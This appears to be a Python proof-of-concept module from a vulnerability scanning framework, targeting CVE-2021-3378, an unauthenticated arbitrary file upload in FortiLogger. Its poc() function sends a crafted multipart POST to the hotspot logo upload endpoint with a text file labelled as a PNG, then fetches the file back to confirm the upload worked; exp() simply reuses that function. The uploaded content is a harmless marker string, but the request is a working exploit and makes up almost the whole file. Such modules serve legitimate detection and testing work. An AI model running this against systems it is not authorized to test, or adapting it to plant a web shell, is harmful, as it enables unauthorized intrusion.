import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''FortiLogger Unauthenticated Arbitrary File Upload''',
        "description": '''This template detects an unauthenticated arbitrary file upload
via insecure POST request. It has been tested on version 4.4.2.2 in
Windows 10 Enterprise.''',
        "severity": "critical",
        "references": [
            "https://erberkan.github.io/2021/cve-2021-3378/"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-3378",
            "cwe-id": "CWE-434"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "fortilogger", "fortigate", "fortinet"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/Config/SaveUploadedHotspotLogoFile"""
        method = "POST"
        data = """------WebKitFormBoundarySHHbUsfCoxlX1bpS
Content-Disposition: form-data; name="file"; filename="poc.txt"
Content-Type: image/png

POC_TEST

------WebKitFormBoundarySHHbUsfCoxlX1bpS"""
        headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS', 'Accept': 'application/json', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/Assets/temp/hotspot/img/logohotspot.txt"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp1.status_code == 200) and ("""POC_TEST""" in resp1.text) and ("""text/plain""" in str(resp1.headers) and """ASP.NET""" in str(resp1.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url